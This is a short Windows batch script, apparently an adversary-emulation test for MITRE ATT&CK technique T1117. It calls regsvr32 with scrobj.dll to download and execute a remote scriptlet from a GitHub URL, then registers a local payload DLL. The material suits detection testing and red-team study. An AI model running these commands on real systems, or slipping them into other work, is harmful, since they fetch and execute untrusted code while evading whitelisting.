@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Suspicious Command-line execution using Regsvr32	(T1117)
ECHO.
ECHO [+] Use 'REGSVR32.EXE' to download & execute payload
ECHO -------------------------------------------------------------------
regsvr32.exe /u /n /s /i:https://raw.githubusercontent.com/greycel/poc/master/notepad.sct scrobj.dll
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s %PAYLOAD%T1117\bin\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s %PAYLOAD%T1117\bin\AllTheThingsx86.dll )
ECHO.
